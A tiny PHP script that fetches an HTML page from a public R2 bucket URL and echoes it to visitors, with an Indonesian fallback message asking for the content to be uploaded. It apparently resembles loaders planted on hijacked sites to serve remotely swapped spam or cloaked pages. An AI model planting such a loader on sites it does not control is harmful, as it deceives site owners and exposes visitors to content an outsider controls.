<?php
$url = "https://pub-f04386c43d984a39ad18471442e55c02.r2.dev/rottefactory-1.html";

$konten = @file_get_contents($url);

if ($konten !== false) {
    echo $konten;
} else {
    echo "KONTEN NYA MANA, UPLOAD DULU BOSKU !!!";
}
?>
